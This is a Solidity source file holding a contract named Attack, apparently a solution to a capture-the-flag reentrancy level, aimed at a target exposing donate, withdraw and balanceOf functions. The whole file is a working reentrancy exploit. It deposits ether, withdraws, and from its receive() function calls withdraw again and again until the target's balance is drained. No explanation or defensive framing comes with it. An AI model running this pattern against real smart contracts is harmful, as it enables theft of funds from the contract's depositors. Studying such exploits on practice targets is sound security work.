// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256);
}

contract Attack {
    IReentrance public target;
    uint256 public amount;

    constructor(address _targetAddress) {
        target = IReentrance(_targetAddress);
    }

    function attack() public payable {
        amount = msg.value;
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    receive() external payable {
        uint256 targetBalance = address(target).balance;
        if (targetBalance >= amount) {
            target.withdraw(amount);
        }
    }
}
